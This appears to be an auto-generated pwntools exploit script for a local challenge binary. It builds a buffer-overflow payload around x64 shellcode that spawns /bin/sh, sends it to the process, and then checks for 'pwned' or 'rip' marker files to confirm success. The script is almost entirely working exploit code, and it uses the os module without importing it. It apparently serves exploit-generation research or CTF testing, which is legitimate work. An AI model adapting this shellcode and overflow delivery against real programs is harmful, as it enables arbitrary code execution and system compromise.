from pwn import *
import time
import sys
import signal
import sf

target = process("./chall-test_callInput-0-x64")
gdb.attach(target, execute="verify_exploit")

bof_payload = sf.BufferOverflow(arch=64)

bof_payload.set_input_start(0x0)
bof_payload.add_bytes(0x0, b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
bof_payload.set_default_byte(b"\x90")
payload = bof_payload.generate_payload()
target.sendline(payload)

# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

def check_verification_done():
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		check_verification_done()
except Exception:
	print("Exploit timed out")
